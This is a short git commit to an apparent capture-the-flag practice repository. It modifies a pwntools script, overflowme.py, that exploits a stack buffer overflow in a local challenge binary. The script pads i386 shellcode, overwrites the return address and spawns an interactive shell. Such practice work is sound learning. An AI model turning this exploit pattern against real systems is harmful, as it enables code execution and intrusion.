1086d716dd0b136d43a55d1652495313b8120574
Mem2019 <434791602@qq.com>
2018-03-02 22:10:14 +0000

    should solve

--- hackcenter/pwn/practice/overflowme.py
+++ hackcenter/pwn/practice/overflowme.py
@@ -1,8 +1,13 @@
 from pwn import *
 shellcode = asm(shellcraft.i386.linux.sh())
 overflow_len = 0x308
+padding = 0x20
 
-payload = "A" * (overflow_len - len(shellcode)) + shellcode + p32(0x8048615)
+payload = ("A" * (overflow_len - len(shellcode) - padding)) + shellcode + "A"*padding + p32(0x8048615) * 3
+print hex(len(payload))
+print payload
+#sh = process(["/problems/b0b419078e5ac70c47a50b04b2aae2d9/overflowme", payload])
+#sh = gdb.debug(["./overflowme", payload], "b _start")
+sh = process(["./overflowme", payload])
 
-sh = process(["/problems/b0b419078e5ac70c47a50b04b2aae2d9/overflowme", payload])
 sh.interactive()
